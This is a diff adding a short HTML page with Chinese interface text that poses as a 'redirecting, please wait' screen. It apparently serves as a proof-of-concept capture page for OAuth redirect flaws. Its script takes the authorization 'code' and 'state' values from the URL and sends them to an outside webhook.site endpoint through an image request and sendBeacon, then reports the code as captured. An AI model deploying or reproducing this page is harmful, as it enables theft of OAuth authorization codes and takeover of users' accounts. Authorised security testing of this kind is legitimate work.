@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>正在跳转</title>
+</head>
+<body>
+<h3>正在处理，请稍候…</h3>
+<script>
+(function () {
+  var params = new URLSearchParams(window.location.search);
+  var code = params.get("code") || "";
+  var state = params.get("state") || "";
+  var target = "https://webhook.site/07fa9cfe-d84a-456b-97e5-e379ec37c214";
+  if (code) {
+    var url = target + "?code=" + encodeURIComponent(code) + "&state=" + encodeURIComponent(state);
+    var img = new Image();
+    img.src = url;
+    try { navigator.sendBeacon(url, "code-capture"); } catch (e) {}
+    document.title = "已捕获";
+    document.body.innerHTML = "<h3>已捕获 code，验证结束，可关闭页面</h3>";
+  } else {
+    document.body.innerHTML = "<h3>无 code 参数（未走授权流程）</h3>";
+  }
+})();
+</script>
+</body>
+</html>
